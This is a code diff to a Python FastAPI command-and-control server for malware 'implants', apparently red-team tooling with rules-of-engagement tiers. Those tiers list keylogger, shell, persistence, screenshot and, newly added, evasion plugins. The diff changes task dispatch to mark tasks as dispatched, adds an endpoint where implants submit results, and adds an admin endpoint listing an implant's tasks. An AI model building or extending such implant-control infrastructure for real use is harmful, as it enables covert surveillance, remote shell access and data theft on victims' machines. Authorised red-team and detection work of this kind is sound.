@@ -22,7 +22,7 @@ def get_db():
 # ROE (Rules of Engagement) Logic
 # ==============================================================================
 ROE_GATES = {
-    1: ["keylogger", "shell", "filesystem", "dummy", "system_profiler", "persistence", "screenshot", "update", "temp_plugin"],
+    1: ["keylogger", "shell", "filesystem", "dummy", "system_profiler", "persistence", "screenshot", "update", "temp_plugin", "evasion"],
     2: ["keylogger", "filesystem", "dummy", "system_profiler", "screenshot"],
     3: [],
 }
@@ -52,17 +52,35 @@ def register_implant(registration: models.ImplantBase, db: Session = Depends(get
 
 @router.get("/tasks", response_model=models.TaskResponse)
 def get_tasks(db: Session = Depends(get_db), current_implant_id: str = Depends(security.get_current_implant_id)):
-    tasks_from_db = db.query(models.Task).filter(models.Task.implant_id == current_implant_id).all()
+    tasks_from_db = db.query(models.Task).filter(
+        models.Task.implant_id == current_implant_id,
+        models.Task.status == "pending"
+    ).all()
     task_schemas = [models.TaskSchema.from_orm(task) for task in tasks_from_db]
+
+    # Mark tasks as dispatched instead of deleting them
     for task in tasks_from_db:
-        db.delete(task)
+        task.status = "dispatched"
     db.commit()
+
     return {"tasks": task_schemas}
 
 @router.post("/data")
 def submit_data(payload: models.DataPayload, current_implant_id: str = Depends(security.get_current_implant_id)):
     print(f"[DATA] Received from {current_implant_id} ({payload.plugin}): {payload.data[:200]}")
     return {"status": "received"}
+
+@router.post("/tasks/result")
+def submit_task_result(payload: models.TaskResult, db: Session = Depends(get_db), current_implant_id: str = Depends(security.get_current_implant_id)):
+    task = db.query(models.Task).filter(models.Task.id == payload.task_id, models.Task.implant_id == current_implant_id).first()
+    if not task:
+        raise HTTPException(status_code=404, detail="Task not found or not owned by this implant")
+
+    task.result = payload.result
+    task.status = "completed"
+    db.commit()
+
+    return {"status": "result recorded"}
 
 @router.get("/admin/implants", response_model=List[models.ImplantSchema])
 def list_implants(db: Session = Depends(get_db)):
@@ -80,6 +98,17 @@ def add_task(implant_id: str, task: models.TaskCreate, db: Session = Depends(get
     db.commit()
     db.refresh(db_task)
     return db_task
+
+@router.get("/admin/tasks/{implant_id}", response_model=List[models.TaskSchema])
+def get_implant_tasks(implant_id: str, db: Session = Depends(get_db)):
+    # First, check if the implant exists
+    db_implant = db.query(models.Implant).filter(models.Implant.id == implant_id).first()
+    if not db_implant:
+        raise HTTPException(status_code=404, detail="Implant not found")
+
+    # Then, return its tasks
+    tasks = db.query(models.Task).filter(models.Task.implant_id == implant_id).all()
+    return tasks
 
 @router.put("/admin/tier/{implant_id}/{tier}", response_model=models.ImplantSchema)
 def set_implant_tier(implant_id: str, tier: int, db: Session = Depends(get_db)):
